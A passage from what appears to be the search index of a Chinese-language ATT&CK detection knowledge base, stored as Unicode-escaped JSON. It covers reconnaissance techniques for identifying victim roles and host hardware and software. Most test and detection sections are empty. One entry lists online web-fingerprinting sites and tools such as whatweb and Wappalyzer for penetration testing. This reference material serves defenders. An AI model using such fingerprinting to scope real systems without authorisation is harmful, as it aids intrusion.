ed\u53ef\u4ee5\u8fdb\u884c\u7cbe\u51c6\u793e\u5de5\uff0c\u6216\u8005\u76f8\u5173\u4eba\u5458\u7684\u8d26\u53f7\u5bc6\u7801\u7206\u7834\uff0c\u4e5f\u53ef\u80fd\u662f\u53d1\u9001\u53d7\u5bb3\u8005\u611f\u5174\u8da3\u7684\u90ae\u4ef6\uff0c\u5b9e\u73b0\u90ae\u4ef6\u9493\u9c7c\u7b49\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E8%A7%92%E8%89%B2/#_2","text":"\u65e0","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E8%A7%92%E8%89%B2/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E8%A7%92%E8%89%B2/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E8%A7%92%E8%89%B2/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E8%A7%92%E8%89%B2/#_6","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E8%A7%92%E8%89%B2/#_7","text":"MITRE-ATT&CK-T1591-004 https://attack.mitre.org/techniques/T1591/004/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF/","text":"T1592-001-\u6536\u96c6\u53d7\u5bb3\u8005\u4e3b\u673a\u4fe1\u606f-\u786c\u4ef6\u4fe1\u606f \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u6709\u5173\u53d7\u5bb3\u8005\u4e3b\u673a\u786c\u4ef6\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u76ee\u6807\u5b9a\u4f4d\u671f\u95f4\u4f7f\u7528\u3002\u6709\u5173\u786c\u4ef6\u57fa\u7840\u8bbe\u65bd\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u4f8b\u5982\u7279\u5b9a\u4e3b\u673a\u4e0a\u7684\u7c7b\u578b\u548c\u7248\u672c\uff0c\u4ee5\u53ca\u662f\u5426\u5b58\u5728\u53ef\u80fd\u6307\u793a\u9644\u52a0\u9632\u5fa1\u4fdd\u62a4\u63aa\u65bd\u7684\u5176\u4ed6\u7ec4\u4ef6\uff08\u4f8b\u5982\uff1a\u5361/\u751f\u7269\u8bc6\u522b\u5668\uff0c\u4e13\u7528\u52a0\u5bc6\u786c\u4ef6\u7b49\uff09\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u4e3b\u52a8\u626b\u63cf\uff08\u4f8b\u5982\uff1a\u4e3b\u673a\u540d\uff0c\u670d\u52a1\u5668\u65d7\u6807\uff0c\u7528\u6237\u4ee3\u7406\u5b57\u7b26\u4e32\uff09\u3001 \u9493\u9c7c\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u5165\u4fb5\u7ad9\u70b9\uff0c\u7136\u540e\u690d\u5165\u65e8\u5728\u6536\u96c6\u8bbf\u95ee\u8005\u4e3b\u673a\u4fe1\u606f\u7684\u6076\u610f\u5185\u5bb9\u3002\u6709\u5173\u786c\u4ef6\u57fa\u7840\u8bbe\u65bd\u7684\u4fe1\u606f\u4e5f\u53ef\u80fd\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u804c\u4f4d\u53d1\u5e03\uff0c\u7f51\u7edc\u5730\u56fe\uff0c\u8bc4\u4f30\u62a5\u544a\uff0c\u5c65\u5386\u8868\u6216\u8d2d\u4e70\u53d1\u7968\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u63d0\u4f9b\u53ef\u80fd\u6027\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\uff0c\u6216\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u53d6\u80fd\u529b\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u653b\u51fb\u786c\u4ef6\u4f9b\u5e94\u94fe\u6216\u786c\u4ef6\u6dfb\u52a0\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u65e0 \u68c0\u6d4b\u65e5\u5fd7 \u65e0 \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1592-001 https://attack.mitre.org/techniques/T1592/001/","title":"T1592-001-\u6536\u96c6\u53d7\u5bb3\u8005\u4e3b\u673a\u4fe1\u606f-\u786c\u4ef6\u4fe1\u606f"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF/#t1592-001-","text":"","title":"T1592-001-\u6536\u96c6\u53d7\u5bb3\u8005\u4e3b\u673a\u4fe1\u606f-\u786c\u4ef6\u4fe1\u606f"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF/#attck","text":"\u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u6709\u5173\u53d7\u5bb3\u8005\u4e3b\u673a\u786c\u4ef6\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u76ee\u6807\u5b9a\u4f4d\u671f\u95f4\u4f7f\u7528\u3002\u6709\u5173\u786c\u4ef6\u57fa\u7840\u8bbe\u65bd\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u4f8b\u5982\u7279\u5b9a\u4e3b\u673a\u4e0a\u7684\u7c7b\u578b\u548c\u7248\u672c\uff0c\u4ee5\u53ca\u662f\u5426\u5b58\u5728\u53ef\u80fd\u6307\u793a\u9644\u52a0\u9632\u5fa1\u4fdd\u62a4\u63aa\u65bd\u7684\u5176\u4ed6\u7ec4\u4ef6\uff08\u4f8b\u5982\uff1a\u5361/\u751f\u7269\u8bc6\u522b\u5668\uff0c\u4e13\u7528\u52a0\u5bc6\u786c\u4ef6\u7b49\uff09\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u4e3b\u52a8\u626b\u63cf\uff08\u4f8b\u5982\uff1a\u4e3b\u673a\u540d\uff0c\u670d\u52a1\u5668\u65d7\u6807\uff0c\u7528\u6237\u4ee3\u7406\u5b57\u7b26\u4e32\uff09\u3001 \u9493\u9c7c\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u5165\u4fb5\u7ad9\u70b9\uff0c\u7136\u540e\u690d\u5165\u65e8\u5728\u6536\u96c6\u8bbf\u95ee\u8005\u4e3b\u673a\u4fe1\u606f\u7684\u6076\u610f\u5185\u5bb9\u3002\u6709\u5173\u786c\u4ef6\u57fa\u7840\u8bbe\u65bd\u7684\u4fe1\u606f\u4e5f\u53ef\u80fd\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u804c\u4f4d\u53d1\u5e03\uff0c\u7f51\u7edc\u5730\u56fe\uff0c\u8bc4\u4f30\u62a5\u544a\uff0c\u5c65\u5386\u8868\u6216\u8d2d\u4e70\u53d1\u7968\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u63d0\u4f9b\u53ef\u80fd\u6027\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\uff0c\u6216\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u53d6\u80fd\u529b\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u653b\u51fb\u786c\u4ef6\u4f9b\u5e94\u94fe\u6216\u786c\u4ef6\u6dfb\u52a0\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF/#_1","text":"\u65e0","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF/#_2","text":"\u65e0","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF/#_6","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF/#_7","text":"MITRE-ATT&CK-T1592-001 https://attack.mitre.org/techniques/T1592/001/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF/","text":"T1592-002-\u6536\u96c6\u53d7\u5bb3\u8005\u4e3b\u673a\u4fe1\u606f-\u8f6f\u4ef6\u4fe1\u606f \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4e8b\u5148\u6536\u96c6\u653b\u51fb\u76ee\u6807\u7684\u4e3b\u673a\u8f6f\u4ef6\u4fe1\u606f\uff0c\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u7ec6\u8282\u4fe1\u606f\u5982\u4e3b\u673a\u4e0a\u7684\u8f6f\u4ef6\u7c7b\u578b\u548c\u7248\u672c\uff0c\u662f\u5426\u6709\u9632\u5fa1\u8f6f\u4ef6\uff08\u5982\u9632\u75c5\u6bd2\u3001SIEM\u7ec4\u4ef6\uff09\u7b49\u3002 \u8f6f\u4ef6\u4fe1\u606f\u53ef\u80fd\u662f\u653b\u51fb\u8005\u901a\u8fc7\u4e3b\u52a8\u626b\u63cf\uff08\u4f8b\u5982\u76d1\u542c\u7aef\u53e3\uff0c\u670d\u52a1\u5668banner\uff0c\u7528\u6237\u4ee3\u7406\u5b57\u7b26\u4e32\uff09\uff0c\u9493\u9c7c\uff0c\u6216\u653b\u51fb\u7f51\u7ad9\u540e\u4f7f\u7528\u6076\u610f\u8f6f\u4ef6\u7b49\u65b9\u5f0f\u4e3b\u52a8\u6536\u96c6\u7684\uff0c\u4e5f\u53ef\u80fd\u662f\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\u804c\u4f4d\u53d1\u5e03\uff0c\u7f51\u7edc\u5730\u56fe\uff0c\u8bc4\u4f30\u62a5\u544a\uff0c\u7b80\u5386\u6216\u8d2d\u4e70\u53d1\u7968\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u7684\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4f1a\u89e6\u53d1\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u884c\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\u6216\u8005\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff09\uff0c\u4ece\u800c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u53d6\u80fd\u529b\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u4f9b\u5e94\u94fe\u653b\u9677\u6216\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6307\u7eb9\u8bc6\u522b\uff1a\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u5bf9\u76ee\u6807\u670d\u52a1\u5668\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\u662f\u76f8\u5f53\u6709\u5fc5\u8981\u7684\uff0c\u56e0\u4e3a\u53ea\u6709\u8bc6\u522b\u51fa\u76f8\u5e94\u7684Web\u5bb9\u5668\u6216\u8005CMS\uff0c\u624d\u80fd\u67e5\u627e\u4e0e\u5176\u76f8\u5173\u7684\u6f0f\u6d1e\uff0c\u7136\u540e\u624d\u80fd\u8fdb\u884c\u76f8\u5e94\u7684\u6e17\u900f\u64cd\u4f5c\u3002 \u5728\u7ebf\u6307\u7eb9\u8bc6\u522b\u7f51\u7ad9\uff1a TSscan: https://scan.top15.cn/web/ BugScaner: http://whatweb.bugscaner.com/look/ \u4e91\u6089\u6307\u7eb9: http://www.yunsee.cn/finger.html WhatWeb: http://whatweb.bugscaner.com/look/ \u5e38\u89c1\u7684\u7f51\u7ad9\u6307\u7eb9\u8bc6\u522b\u5de5\u5177\u6709\uff1awhatweb\uff0cwappalyzer\u706b\u72d0\u63d2\u4ef6\u7b49\u3002 \u68c0\u6d4b\u65e5\u5fd7 \u65e0 \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1592-002 https://attack.mitre.org/techniques/T1592/002/ \u6307\u7eb9\u8bc6\u522b\u5927\u5168 https://www.bilibili.com/read/cv9136494/","title":"T1592-002-\u6536\u96c6\u53d7\u5bb3\u8005\u4e3b\u673a\u4fe1\u606f-\u8f6f\u4ef6\u4fe1\u606f"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF/#t1592-002-","text":"","title":"T1592-002-\u6536\u96c6\u53d7\u5bb3\u8005\u4e3b\u673a\u4fe1\u606f-\u8f6f\u4ef6\u4fe1\u606f"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4e8b\u5148\u6536\u96c6\u653b\u51fb\u76ee\u6807\u7684\u4e3b\u673a\u8f6f\u4ef6\u4fe1\u606f\uff0c\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u7ec6\u8282\u4fe1\u606f\u5982\u4e3b\u673a\u4e0a\u7684\u8f6f\u4ef6\u7c7b\u578b\u548c\u7248\u672c\uff0c\u662f\u5426\u6709\u9632\u5fa1\u8f6f\u4ef6\uff08\u5982\u9632\u75c5\u6bd2\u3001SIEM\u7ec4\u4ef6\uff09\u7b49\u3002 \u8f6f\u4ef6\u4fe1\u606f\u53ef\u80fd\u662f\u653b\u51fb\u8005\u901a\u8fc7\u4e3b\u52a8\u626b\u63cf\uff08\u4f8b\u5982\u76d1\u542c\u7aef\u53e3\uff0c\u670d\u52a1\u5668banner\uff0c\u7528\u6237\u4ee3\u7406\u5b57\u7b26\u4e32\uff09\uff0c\u9493\u9c7c\uff0c\u6216\u653b\u51fb\u7f51\u7ad9\u540e\u4f7f\u7528\u6076\u610f\u8f6f\u4ef6\u7b49\u65b9\u5f0f\u4e3b\u52a8\u6536\u96c6\u7684\uff0c\u4e5f\u53ef\u80fd\u662f\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\u804c\u4f4d\u53d1\u5e03\uff0c\u7f51\u7edc\u5730\u56fe\uff0c\u8bc4\u4f30\u62a5\u544a\uff0c\u7b80\u5386\u6216\u8d2d\u4e70\u53d1\u7968\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u7684\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4f1a\u89e6\u53d1\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u884c\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\u6216\u8005\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff09\uff0c\u4ece\u800c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u53d6\u80fd\u529b\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u4f9b\u5e94\u94fe\u653b\u9677\u6216\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF/#_1","text":"\u6307\u7eb9\u8bc6\u522b\uff1a\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u5bf9\u76ee\u6807\u670d\u52a1\u5668\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\u662f\u76f8\u5f53\u6709\u5fc5\u8981\u7684\uff0c\u56e0\u4e3a\u53ea\u6709\u8bc6\u522b\u51fa\u76f8\u5e94\u7684Web\u5bb9\u5668\u6216\u8005CMS\uff0c\u624d\u80fd\u67e5\u627e\u4e0e\u5176\u76f8\u5173\u7684\u6f0f\u6d1e\uff0c\u7136\u540e\u624d\u80fd\u8fdb\u884c\u76f8\u5e94\u7684\u6e17\u900f\u64cd\u4f5c\u3002 \u5728\u7ebf\u6307\u7eb9\u8bc6\u522b\u7f51\u7ad9\uff1a TSscan: https://scan.top15.cn/web/ BugScaner: http://whatweb.bugscaner.com/look/ \u4e91\u6089\u6307\u7eb9: http://www.yunsee.cn/finger.html WhatWeb: http://whatweb.bugscaner.com/look/ \u5e38\u89c1\u7684\u7f51\u7ad9\u6307\u7eb9\u8bc6\u522b\u5de5\u5177\u6709\uff1awhatweb\uff0cwappalyzer\u706b\u72d0\u63d2\u4ef6\u7b49\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF/#_2","text":"\u65e0","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF/#_6","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u